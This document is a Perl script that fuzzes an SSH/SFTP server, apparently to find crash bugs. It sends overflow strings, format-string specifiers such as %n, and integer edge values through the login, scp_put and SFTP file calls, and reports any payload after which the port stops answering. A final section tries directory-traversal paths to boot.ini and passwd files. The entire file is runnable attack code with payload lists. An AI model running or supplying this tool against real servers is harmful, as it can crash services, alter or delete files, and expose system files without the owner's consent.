#!/usr/bin/perl -w
use Net::SSH2;
use IO::Socket;
$|=1;

$host=shift;
$port=shift || '22';
die "usage: $0 \$host [\$port]\n" if(!defined($host));

sub check(){
	$check_run=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined $check_run){
		#print "$host -> $port is alive.\n";
		$check_run->close;
		return 1;
	}else{
		#die("$host -> $port is closed!\n");
		return 0;
	}
}

@bfo=(
'A'x5,
'A'x17,
'A'x33,
'A'x65,
'A'x76,
'A'x129,
'A'x257,
'A'x513,
'A'x1024,
'A'x2049,
'A'x4097,
'A'x8193,
'A'x12288
);
@fse=(
'%s%p%x%d',
'024d',
'%.2049d',
'%p%p%p%p',
'%x%x%x%x',
'%d%d%d%d',
'%s%s%s%s',
'%99999999999s',
'%08x',
'%%20d',
'%%20n',
'%%20x',
'%%20s',
'%s%s%s%s%s%s%s%s%s%s',
'%p%p%p%p%p%p%p%p%p%p',
'%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%',
'%s'x129,
'%x'x257
);
@int=(
'-1',
'0',
'0x100',
'0x1000',
'0x3fffffff',
'0x7ffffffe',
'0x7fffffff',
'0x80000000',
'0xfffffffe',
'0xffffffff',
'0x10000',
'0x100000',
'1'
);
@all=@bfo;
push(@all, @fse);
push(@all, @int);

print "Username Fuzzing ... \n";
$password='aaa';
undef($result);
foreach $username_fuzz (@all){
	$ssh1 = Net::SSH2->new();
	$ssh1->connect($host, $port) || die "can not connect the server, please check.\n";
	$ssh1->auth_password($username_fuzz, $password);
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $username_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "USERNAME Payload is $username_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	$ssh1->disconnect();
}
print "Finish!\n";

print "Password Fuzzing ... \n";
print "Please enter a valid username : ";
$valid_username=<STDIN>;
chop($valid_username);
undef($result);
foreach $password_fuzz (@all){
	$ssh2 = Net::SSH2->new();
	$ssh2->connect($host, $port) || die "can not connect the server, please check.\n";
	$ssh2->auth_password($valid_username, $password_fuzz);
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $password_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "PASSWORD Payload is $password_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	$ssh2->disconnect();
}
print "Finish!\n";

print "Real Username : ";
$real_username=<STDIN>;
chop($real_username);
print "Real Password : ";
$real_password=<STDIN>;
chop($real_password);

print "SCP_PUT Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh3 = Net::SSH2->new();
	$ssh3->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh3->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh3->auth_ok));
	#print "$filename_fuzz\n";
	$ssh3->scp_put($filename_fuzz, $filename_fuzz);
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_PUT FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	$ssh3->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND open Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_open = Net::SSH2->new();
	$ssh4_open->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_open->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_open->auth_ok));
	$sftp4_open = $ssh4_open->sftp();
	$sftp4_open->open($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND OPEN FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_open);
	$ssh4_open->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND opendir Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_opendir = Net::SSH2->new();
	$ssh4_opendir->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_opendir->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_opendir->auth_ok));
	$sftp4_opendir = $ssh4_opendir->sftp();
	$sftp4_opendir->opendir($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND OPENDIR FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_opendir);
	$ssh4_opendir->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND unlink Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_unlink = Net::SSH2->new();
	$ssh4_unlink->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_unlink->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_unlink->auth_ok));
	$sftp4_unlink = $ssh4_unlink->sftp();
	$sftp4_unlink->unlink($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND UNLINK FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_unlink);
	$ssh4_unlink->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND stat Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_stat = Net::SSH2->new();
	$ssh4_stat->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_stat->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_stat->auth_ok));
	$sftp4_stat = $ssh4_stat->sftp();
	$sftp4_stat->stat($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND STAT FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_stat);
	$ssh4_stat->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND mkdir Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_mkdir = Net::SSH2->new();
	$ssh4_mkdir->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_mkdir->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_mkdir->auth_ok));
	$sftp4_mkdir = $ssh4_mkdir->sftp();
	$sftp4_mkdir->mkdir($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND MKDIR FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_mkdir);
	$ssh4_mkdir->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND realpath Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_realpath = Net::SSH2->new();
	$ssh4_realpath->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_realpath->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_realpath->auth_ok));
	$sftp4_realpath = $ssh4_realpath->sftp();
	$sftp4_realpath->realpath($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND REALPATH FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_realpath);
	$ssh4_realpath->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND readlink Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_readlink = Net::SSH2->new();
	$ssh4_readlink->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_readlink->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_readlink->auth_ok));
	$sftp4_readlink = $ssh4_readlink->sftp();
	$sftp4_readlink->readlink($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND READLINK FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_readlink);
	$ssh4_readlink->disconnect();
}
print "Finish!\n";

print "SCP_COMMAND rmdir Fuzzing ... \n";
undef($filename_fuzz);
undef($result);
foreach $filename_fuzz (@all){
	$ssh4_rmdir = Net::SSH2->new();
	$ssh4_rmdir->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh4_rmdir->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh4_rmdir->auth_ok));
	$sftp4_rmdir = $ssh4_rmdir->sftp();
	$sftp4_rmdir->rmdir($filename_fuzz);
	#print "$filename_fuzz\n";
	sleep(3);
	$result=&check();
	sleep(3);
	#print "Payload: $filename_fuzz.\nResult: $result.\n";
	if($result!=1){
		print "SCP_COMMAND RMDIR FILENAME Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($result);
	undef($sftp4_rmdir);
	$ssh4_rmdir->disconnect();
}
print "Finish!\n";

print "Directory Traversal Fuzzing ... \n";
@directory_traversal=(
'..\boot.ini',
'..\..\boot.ini',
'..\..\..\boot.ini',
'..\..\..\..\boot.ini',
'..\..\..\..\..\boot.ini',
'..\..\..\..\..\..\boot.ini',
'..\..\..\..\..\..\..\boot.ini',
'../boot.ini',
'../../boot.ini',
'../../../boot.ini',
'../../../../boot.ini',
'../../../../../boot.ini',
'../../../../../../boot.ini',
'../../../../../../../boot.ini',
'c:\boot.ini',
'..\c:\boot.ini',
'..\..\c:\boot.ini',
'..\..\..\c:\boot.ini',
'..\..\..\..\c:\boot.ini',
'..\..\..\..\..\c:\boot.ini',
'..\..\..\..\..\..\c:\boot.ini',
'c:\boot.ini',
'../c:\boot.ini',
'../../c:\boot.ini',
'../../../c:\boot.ini',
'../../../../c:\boot.ini',
'../../../../../c:\boot.ini',
'../../../../../../c:\boot.ini',
'../passwd',
'../../passwd',
'../../../passwd',
'../../../../passwd',
'../../../../../passwd',
'../../../../../../passwd',
'../../../../../../../passwd',
'..\passwd',
'..\..\passwd',
'..\..\..\passwd',
'..\..\..\..\passwd',
'..\..\..\..\..\passwd',
'..\..\..\..\..\..\passwd',
'..\..\..\..\..\..\..\passwd'
);
undef($filename_fuzz);
foreach $filename_fuzz (@directory_traversal){
	$ssh5 = Net::SSH2->new();
	$ssh5->connect($host, $port) || die "can not connect the server, please check!\n";
	$ssh5->auth_password($real_username, $real_password);
	die "username of password is wrong!\n" if(!($ssh5->auth_ok));
	undef($sftp5);
	$sftp5 = $ssh5->sftp();
	if($sftp5->open($filename_fuzz)){
		print "Directory Traversal Payload is $filename_fuzz.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	$ssh5->disconnect();
}
print "Finish!\n";

print "The End.\n";
exit(0);